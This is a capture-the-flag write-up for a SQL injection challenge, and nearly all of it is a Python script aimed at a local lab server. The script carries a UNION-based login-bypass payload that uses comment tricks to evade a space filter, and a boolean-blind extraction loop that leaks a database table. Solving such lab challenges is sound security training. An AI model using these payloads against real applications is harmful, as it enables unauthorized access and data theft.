# SQLi - 0x2

## Write-up

```python
#!/usr/bin/python3
from hashlib import sha256
import re
import requests

url = "http://localhost:8000/"
password = "hfz"
password_hash = sha256(password.encode()).hexdigest()

# First part: Login bypass
payload = f"a'and/**/1=0/**/union/**/select/**/'admin','{password_hash}$"
response = requests.post(
    url=url, data={"user": payload, "pass": password}
).text.strip()
first_flag = re.search("shellmates{[^}]+}", response).group(0)
print(f"Part 1: {first_flag}")

# Second part: Leak flag from database (boolean based blind SQLi)
def get_output(query):
    payload_tmpl = (
        "a'and/**/1=0/**/"
        f"union/**/select/**/'admin','{password_hash}$'/**/"
        "where/**/substr(({}),{},1)=char({})/**/"
        "and/**/'1'='1"
    )

    query = query.replace(" ", "/**/")
    output = ""
    while True:
        for c in range(32, 127):
            payload = payload_tmpl.format(query, len(output) + 1, c)
            response = requests.post(
                url=url, data={"user": payload, "pass": password}, allow_redirects=False
            )
            if first_flag in response.text:
                output += chr(c)
                print(f"{output}", end="\r")
                break
        else:
            break
    return output


# Get database schema, we'll find a table name called
# t0t4lly_n0t_susp1ci10us with a flag column
# query = "select group_concat(sql) from sqlite_master"
second_flag = get_output("select flag from t0t4lly_n0t_susp1ci10us")
print(f"Part 2: {second_flag}")
```

## Flag

`shellmates{1_r34lly_h0p3_u_d1dnt_us3_4n_aut0m4t3d_t0ol}`
